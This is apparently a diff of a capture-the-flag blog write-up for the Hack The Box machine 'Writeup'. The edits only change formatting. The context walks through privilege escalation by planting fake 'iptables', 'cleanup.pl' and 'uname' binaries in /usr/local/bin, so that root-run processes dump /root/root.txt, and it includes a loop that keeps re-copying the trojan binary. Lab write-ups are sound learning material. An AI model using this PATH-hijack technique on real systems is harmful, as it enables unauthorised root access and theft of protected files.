@@ -287,7 +287,7 @@ root      1803  0.0  1.5 431184 16096 ?        Sl   17:19   0:03 /usr/bin/python
 ```
 There are a lot of data to look at here and I spent a lot of time going through it all and making a lot of terrible assumptions that cost me time. The concept of privilege escalation is exploiting a flaw in where that whatever is being run typically is being run by a user with higher rights than you do, and in my experience this typically requires a trigger to initiate the action. This can be a cron job/scheduled task or some action that I also have control over. I then remembered that Eeyore DoS protection – this must be the fail2ban thing and what do you know, its running as root! 
 
-This piques my interest very much. It is a mechanism that we can use to trigger something to happen – remember I didn’t want to dirb the url?! How can we get control over it? Look at our $PATH:
+This piques my interest very much. It is a mechanism that we can use to trigger something to happen – remember I didn’t want to dirb the url?! How can we get control over it? Look at our `$PATH`:
 
 ```console
 jkr@writeup:~$ echo $PATH
@@ -320,7 +320,7 @@ GENERATED WORDS: 4612
 END_TIME: Tue Oct  1 21:31:16 2019
 DOWNLOADED: 19 - FOUND: 0
 ```
-And what our output is in pspy:
+And what our output is in [PSpy](https://github.com/DominicBreuker/pspy):
 
 ```console
 2019/10/01 21:35:40 CMD: UID=0    PID=1      | init [2]   
@@ -361,14 +361,14 @@ drwxrwsr-x  7 root staff  4096 Apr 19 04:30 share
 drwxrwsr-x  2 root staff  4096 Apr 19 04:11 src
 ```
 
-Cool – so let’s set our trap. On machines like this, where the flag is located shouldn’t ever really be a mystery – user.txt will be in the user’s home directory or desktop and root.txt will be in the root directory or administrator’s desktop. Looking carefully at the pspy output below iptables is a good candidate to replace for our trap because it does not have a clearly defined path, check out PID 3639: 
+Cool – so let’s set our trap. On machines like this, where the flag is located shouldn’t ever really be a mystery – `user.txt` will be in the user’s home directory or desktop and `root.txt` will be in the root directory or administrator’s desktop. Looking carefully at the PSpy output below iptables is a good candidate to replace for our trap because it does not have a clearly defined path, check out **PID 3639**: 
 
 ```console
 2019/10/01 21:35:44 CMD: UID=0    PID=3636   | /bin/sh -c iptables -w -n -L INPUT | grep -q 'f2b-apache-404[ \t]' 
 2019/10/01 21:35:44 CMD: UID=0    PID=3638   | /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -b 
 2019/10/01 21:35:44 CMD: UID=0    PID=3639   | iptables -w -I f2b-apache-404 1 -s 10.10.14.75 -j REJECT --reject-with icmp-port-unreachable 
 ```
-I want to create "iptables" and put it in my /usr/local/bin/ directory which when 3639 runs will spit out the root flag to a readable directory for me:
+I want to create "iptables" and put it in my /usr/local/bin/ directory which when **3639** runs will spit out the root flag to a readable directory for me:
 
 ```console
 create "iptables":
@@ -416,7 +416,7 @@ tmp  user.txt
 ```
 Didn’t work. What the hell. Typically, I assume that I did something wrong and give it a few more attempts before quitting. This time I was also pretty interested in that root/bin/cleanup/cleanup.pl script.
 
-We are going to use the same procedure as iptables, create a cleanup.pl script that spits out our root flag that we so deserve:
+We are going to use the same procedure as `iptables`, create a `cleanup.pl` script that spits out our root flag that we so deserve:
 
 ```console
 #!/bin/bash
@@ -424,7 +424,7 @@ cat /root/root.txt > /home/jkr/root.txt
 ```
 Damnit dude, what the hell. At this point I went from being 100% certain I know what to do. I recheck all my scripts for syntax errors or other stupid things I overlooked. I did not find anything. I went to bed.
 
-New day – thinking about what other things we can trigger. I didn’t see any interesting cron jobs that I could leverage. Let’s look at what happens when I log into the box to begin with by run pspy on one terminal and login with another:
+New day – thinking about what other things we can trigger. I didn’t see any interesting cron jobs that I could leverage. Let’s look at what happens when I log into the box to begin with by run Pspy on one terminal and login with another:
 
 ```console
 root@endeavour:~/htb/writeup# ssh jkr@10.10.10.138
@@ -440,7 +440,7 @@ permitted by applicable law.
 Last login: Wed Oct  2 11:28:15 2019 from 10.10.14.75
 ```
 
-Our pspy output:
+Our Pspy output:
 
 ```console
 2019/10/02 11:30:48 CMD: UID=0    PID=1      | init [2]   
@@ -489,7 +489,7 @@ I decided to check to make sure my file was even still there:
 jkr@writeup:~$ ls -al /usr/local/bin/uname
 ls: cannot access '/usr/local/bin/uname': No such file or directory
 ```
-The heck, it’s not even there. It must have been deleted somehow. I was sure that I put it there, and the box wasn’t reset at all during the 15 seconds or so between waiting it was deleted somehow. At this point, rather discouraged I made a bash one liner - an infinite loop copying the replacement uname into /usr/local/bin:
+The heck, it’s not even there. It must have been deleted somehow. I was sure that I put it there, and the box wasn’t reset at all during the 15 seconds or so between waiting it was deleted somehow. At this point, rather discouraged I made a bash one liner - an infinite loop copying the replacement uname into `/usr/local/bin`:
 
 ```console
 while true; do cp /home/jkr/tmp/uname /usr/local/bin/uname; done
